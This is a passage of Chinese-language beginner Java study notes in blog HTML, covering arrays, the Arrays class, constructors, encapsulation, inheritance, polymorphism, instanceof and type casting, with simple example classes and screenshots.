<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        printArray(array);</span><br><span class="line">        <span class="type">int</span> [] result = reverse(array);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : result) &#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将数组进行封装，打印数组元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">(<span class="type">int</span> [] array)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : array) &#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反转数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span> [] array)&#123;</span><br><span class="line">        <span class="type">int</span> [] rev = <span class="keyword">new</span> <span class="title class_">int</span>[array.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            rev[i] = array[array.length-i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221101214604150.png" alt="image-20221101214604150"></p>
</li>
</ul>
<h3 id="4、二维数组">1.4.4. 4、二维数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">int</span> [][] array = &#123;&#123;<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">        System.out.println(array[<span class="number">0</span>][<span class="number">0</span>]);    <span class="comment">// 输出2</span></span><br><span class="line">        System.out.println(array[<span class="number">0</span>][<span class="number">1</span>]);    <span class="comment">// 输出3</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=====================================&quot;</span>);</span><br><span class="line">        <span class="comment">// 遍历二维数组中的每个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; array[i].length; j++) &#123;</span><br><span class="line">                System.out.print(array[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221101220205987.png" alt="image-20221101220205987"></p>
<h3 id="5、Arrays类">1.4.5. 5、Arrays类</h3><ul>
<li>Arrays.toString打印数组元素</li>
<li>Arrays.sort对数组进行升序</li>
<li>Arrays.fill将数组进行填充，第一个参数为数组，第二个为填充数值,也可以增加指定填充范围</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">444</span>,<span class="number">5555</span>,<span class="number">123213</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// Arrays.toString打印数组元素</span></span><br><span class="line">        System.out.println(Arrays.toString(array));</span><br><span class="line">        <span class="comment">// Arrays.sort对数组进行升序</span></span><br><span class="line">        Arrays.sort(array);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            System.out.print(array[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="comment">// Arrays.fill将数组进行填充，第一个参数为数组，第二个为填充数值,也可以增加指定填充范围</span></span><br><span class="line">        Arrays.fill(array,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : array) &#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        System.out.println(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        Arrays.fill(array,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : array) &#123;</span><br><span class="line">            System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221101221817794.png" alt="image-20221101221817794"></p>
<h3 id="6、稀疏数组">1.4.6. 6、稀疏数组</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221101222214216.png" alt="image-20221101222214216"></p>
<h2 id="面向对象">1.5. 面向对象</h2><p>面向对象编程的本质就是，以类的方式组织代码，以对象的组织（封装）数据</p>
<h3 id="1、方法的调用">1.5.1. 1、方法的调用</h3><ul>
<li>一个.java文件里面只能有一个public类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果有static的时候可以直接.出方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Student.student(<span class="number">18</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        System.out.println(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">        <span class="comment">// 没有static的时候需要new创建对象，才能.出方法</span></span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">result2</span> <span class="operator">=</span> teacher.teacher(<span class="string">&quot;数学&quot;</span>,<span class="number">33</span>);</span><br><span class="line">        System.out.println(result2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">student</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是学生 我的姓名是:&quot;</span> + name + <span class="string">&quot; 年龄:&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>teacher.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">teacher</span><span class="params">(String obj,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是老师 我教的是:&quot;</span> + obj + <span class="string">&quot; 年龄:&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221102214838445.png" alt="image-20221102214838445"></p>
<h3 id="2、类与对象的调用">1.5.2. 2、类与对象的调用</h3><ul>
<li><p>this指向的是类的属性</p>
</li>
<li><p>new除了分配内存空间，还会给new出来的对象会有一个默认初始值，根据属性类型决定。</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103092957524.png" alt="image-20221103092957524"></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.age = <span class="number">18</span>;</span><br><span class="line">        student.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> student.introduce();</span><br><span class="line">        System.out.print(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">introduce</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是学生 我的姓名是:&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot; 年龄:&quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103093018025.png" alt="image-20221103093018025"></p>
<h3 id="3、构造器">1.5.3. 3、构造器</h3><ul>
<li><p><strong>必须与类名相同</strong></p>
</li>
<li><p><strong>必须没有返回值，也不能写void</strong></p>
</li>
<li><p><strong>new的本质就是在调用构造器</strong></p>
</li>
<li><p>alt + insert快捷生成构造器</p>
</li>
</ul>
<h4 id="3-1、有参构造">1.5.3.1. 3.1、有参构造</h4><ul>
<li>一旦定义了有参构造，无参就必须显示定义</li>
</ul>
<h4 id="3-2、无参构造">1.5.3.2. 3.2、无参构造</h4><ul>
<li>无参构造器的作用是可以实例化初始值</li>
<li>没有任何参数传递的构造器，称为无参构造</li>
<li>一个类即使什么都不写也会存在一个构造器</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 一个类即使什么都不写也会存在一个构造器</span></span><br><span class="line">    <span class="comment">// 没有任何参数传递的构造器，称为无参构造</span></span><br><span class="line">    <span class="comment">// 无参构造器的作用是可以实例化初始值</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="comment">// 有参构造: 一旦定义了有参构造，无参就必须显示定义</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">// 将传入的name值赋给类属性name</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103102045696.png" alt="image-20221103102045696"></p>
<h3 id="4、三大特性（封装、继承、多态）">1.5.4. 4、三大特性（封装、继承、多态）</h3><h4 id="4-1、封装">1.5.4.1. 4.1、封装</h4><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103105649374.png" alt="image-20221103105649374"></p>
<ul>
<li>私有属性通过get&#x2F;set方法调用</li>
<li>alt + insert 自动生成get&#x2F;set</li>
<li>优点<ol>
<li>提高程序的安全性，保护数据</li>
<li>隐藏代码的实现细节</li>
<li>统一接口</li>
<li>增加系统可维护性</li>
</ol>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> s1.getName();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">// private 私有，无法无法被直接调用</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobbies;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以提供一个public的方法去获取该属性</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHobbies</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbies</span><span class="params">(String hobbies)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103155228714.png" alt="image-20221103155228714"></p>
<h4 id="4-2、继承">1.5.4.2. 4.2、继承</h4><ul>
<li>无法继承final类</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103160242433.png" alt="image-20221103160242433"></p>
<h5 id="4-2-1、object类">1.5.4.2.1. 4.2.1、object类</h5><ul>
<li>继承关键字，extends</li>
<li>Java中只有单继承</li>
<li>所有类默认继承Object类</li>
<li>修饰符<ul>
<li>public</li>
<li>protected</li>
<li>default</li>
<li>private</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.say();</span><br><span class="line">        System.out.println(student.money);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">10_0000_0000</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can say&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4-2-2、super">1.5.4.2.2. 4.2.2、super</h5><ul>
<li><p>super获取父类的属性</p>
</li>
<li><p>private私有的东西无法被继承</p>
</li>
<li><p>调用父类构造器，必须放在第一行</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103164857934.png" alt="image-20221103164857934"></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.test(<span class="string">&quot;气温太低&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(name);   	<span class="comment">// 调用传参的name</span></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name);  <span class="comment">// 调用类的name</span></span><br><span class="line">        System.out.println(<span class="built_in">super</span>.name); <span class="comment">// 调用父类的name</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;qiwentaidi&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103164249016.png" alt="image-20221103164249016"></p>
<h5 id="4-2-3、方法的重写">1.5.4.2.3. 4.2.3、方法的重写</h5><ul>
<li>静态方法和非静态方法区别<ul>
<li>方法的重写与静态方法无关<img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103181430901.png" alt="image-20221103181430901"></li>
</ul>
</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103180245272.png" alt="image-20221103180245272"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221103180844188.png" alt="image-20221103180844188"></p>
<h4 id="4-3、多态">1.5.4.3. 4.3、多态</h4><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221104132700655.png" alt="image-20221104132700655"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221104132607756.png" alt="image-20221104132607756"></p>
<ul>
<li>可以指向的引用类型不确定:父类的引用子类,指向父类类型</li>
</ul>
<p>Application.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package src.OPP;</span><br><span class="line"></span><br><span class="line">import src.OPP.Demo05.*;</span><br><span class="line"></span><br><span class="line">public class Application &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        /*</span><br><span class="line">         *  一个对象的实际类型是确定的</span><br><span class="line">         *  new Student();</span><br><span class="line">         *  new Person();</span><br><span class="line">         */</span><br><span class="line">        Student s1 = new Student();</span><br><span class="line">        // 可以指向的引用类型不确定:父类的引用子类,指向父类类型</span><br><span class="line">        Person s2 = new Student();</span><br><span class="line">        Object s3 = new Student();</span><br><span class="line">        // 父类不能调用子类的方法，子类可以调用父类的方法</span><br><span class="line">        // 对象能调用方法执行，主要看对象左边的类型，与右边关系不大</span><br><span class="line">        s1.run();</span><br><span class="line">        s2.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line">public class Student extends Person&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run()&#123;</span><br><span class="line">        System.out.println(&quot;I can&#x27;t running&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221104171343304.png" alt="image-20221104171343304"></p>
<h5 id="4-3-1、instanceof">1.5.4.3.1. 4.3.1、instanceof</h5><ul>
<li>instanceof判断一个类是否是另一个类的父类，返回布尔值</li>
<li>格式 :<code>X instanceof Y</code>,  X要与Y存在父子关系才能编译通过</li>
<li>instanceof只能对比有联系的类型</li>
</ul>
<p>Application.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> src.OPP.Demo05.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// Object =&gt; Person =&gt; Teacher</span></span><br><span class="line">        <span class="comment">// Object =&gt; Person =&gt; Student</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">// instanceof 判读类是否为另一个类的父类，返回布尔类型</span></span><br><span class="line">        System.out.println(o1 <span class="keyword">instanceof</span> Student);<span class="comment">// true</span></span><br><span class="line">        <span class="comment">// 因为o1实例化的是Student类，Teacher类与Student类没有直系关系，所以返回false</span></span><br><span class="line">        System.out.println(o1 <span class="keyword">instanceof</span> Teacher);<span class="comment">// false</span></span><br><span class="line">        System.out.println(o1 <span class="keyword">instanceof</span> Object);<span class="comment">// true</span></span><br><span class="line">        System.out.println(o1 <span class="keyword">instanceof</span> Person);<span class="comment">// true</span></span><br><span class="line">        System.out.println(o1 <span class="keyword">instanceof</span> String);<span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Student.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Teacher.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221104195203208.png" alt="image-20221104195203208"></p>
<h5 id="4-3-2、类型转换">1.5.4.3.2. 4.3.2、类型转换</h5><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221105134029426.png" alt="image-20221105134029426"></p>
<ul>
<li><p>高转低（强转）,不强转只能调用父类的方法，强转后才能调用子类方法</p>
<p>Application.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> src.OPP.Demo05.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 类型转换</span></span><br><span class="line">        <span class="comment">// 高-------------------低</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) obj;</span><br><span class="line">        student.say();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.OPP.Demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I can running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Student.java</p>
